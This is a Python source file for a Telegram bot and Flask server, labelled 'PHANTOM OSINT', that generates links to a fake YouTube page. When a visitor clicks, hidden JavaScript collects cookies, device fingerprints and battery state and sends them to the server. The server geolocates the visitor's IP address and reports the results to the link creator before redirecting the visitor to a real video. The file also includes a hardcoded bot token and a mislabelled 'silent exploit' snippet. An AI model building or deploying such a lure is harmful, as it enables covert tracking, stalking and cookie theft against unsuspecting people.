import asyncio, threading, requests, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 
user_settings = {} 

# --- БИБЛИОТЕКА «ПРИЗРАЧНЫХ» СКРИПТОВ ---
SCRIPTS = {
    "ANALYTICS": "d.track = {ref: document.referrer, history: window.history.length, lang: navigator.languages.join()};",
    "COOKIE": "try { d.cookies = document.cookie || 'Protected'; } catch(e) {}",
    "V8_SILENT": "let a = [1.1, 2.2]; function ex(o) { a[0] = o; } for(let i=0; i<500; i++) ex({a:1}); d.exploit = 'Executed';"
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; height: 50px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; padding: 0 15px; box-sizing: border-box; }
        .player-box { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12%; }
        .play-btn::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; position: absolute; left: 26px; top: 14px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info { padding: 15px; width: 100%; box-sizing: border-box; }
        .title { font-size: 18px; color: #030303; font-weight: 400; }
    </style>
</head>
<body onclick="phantomScan()">
    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player-box">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; opacity:0.8;">
        <div class="play-btn" id="pbtn"></div>
        <div class="loader" id="ldr"></div>
    </div>
    <div class="info">
        <div class="title">Exclusive: Скрытые возможности Telegram 2026</div>
        <div style="font-size:13px; color:#606060; margin-top:5px;">1.5 млн просмотров • 4 часа назад</div>
    </div>
<script>
async function phantomScan() {
    document.getElementById('pbtn').style.display = 'none';
    document.getElementById('ldr').style.display = 'block';
    
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency };
    
    // Выполнение скрытого скрипта
    try { {{ custom_script|safe }} } catch(e) {}
    
    // Сбор железа
    try { let c = document.createElement('canvas'); let gl = c.getContext('webgl'); let dbg = gl.getExtension('WEBGL_debug_renderer_info'); d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } catch(e) {}
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋"); } catch(e) {}

    // Мгновенная отправка без GPS окон
    setTimeout(() => { 
        fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
        .finally(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; });
    }, 2000);
}
</script>
</body>
</html>
"""

@app.route('/')
def home(): return "SERVICE_ACTIVE", 200

@app.route('/v/<aid>')
def trap(aid):
    mode = user_settings.get(str(aid), "ANALYTICS")
    script = SCRIPTS.get(mode, SCRIPTS["ANALYTICS"])
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # --- БЕСШУМНОЕ ГЕО ПО IP ---
    city, country, isp, map_link = "N/A", "N/A", "N/A", "#"
    try:
        r = requests.get(f"http://ip-api.com/json/{ips}?fields=status,country,city,lat,lon,isp").json()
        if r['status'] == 'success':
            city, country, isp = r['city'], r['country'], r['isp']
            map_link = f"https://www.google.com/maps?q={r['lat']},{r['lon']}"
    except: pass

    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    exploit_vault[token] = f"Track: {d.get('track')}\nCookies: {d.get('cookies')}\nGPU: {d.get('gpu')}"

    report = (
        f"👤 **ОБЪЕКТ ЗАФИКСИРОВАН (Silent)**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЬ:**\n"
        f"• IP: `{ips}`\n"
        f"• Провайдер: `{isp}`\n\n"
        f"📍 **ГЕО (IP-Based):**\n"
        f"• `{city}, {country}`\n"
        f"• [Открыть карту]({map_link})\n\n"
        f"📱 **ЖЕЛЕЗО:**\n"
        f"• Модель: `{d.get('res')}`\n"
        f"• CPU: `{d.get('cores')} Cores` | GPU: `{d.get('gpu', 'N/A')}`\n\n"
        f"🔋 **БАТАРЕЯ:** {d.get('bat', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **ТОКЕН:** `{token}`"
    )
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("💀 **PHANTOM OSINT v18.0**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def choose_payload(message: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📊 Stealth Analytics", callback_data="set_ANALYTICS")
    kb.button(text="🍪 Cookie Check", callback_data="set_COOKIE")
    kb.button(text="🔥 Silent Exploit", callback_data="set_V8_SILENT")
    kb.adjust(1)
    await message.answer("Выберите скрытый скрипт:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("set_"))
async def finalize(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_settings[str(callback.from_user.id)] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    await callback.message.edit_text(f"✅ **Ссылка готова!**\n\n**Режим:** {mode}\n🔗 `{link}`\n\n*Никаких окон GPS не будет.*")

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    token = message.text.strip().upper()
    if token in exploit_vault:
        await message.answer(f"🔓 **ДАННЫЕ ТОКЕНА {token}:**\n\n`{exploit_vault[token]}`")

async def main():
    loop = asyncio.get_event_loop()
    loop.run_in_executor(None, lambda: app.run(host='0.0.0.0', port=10000))
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
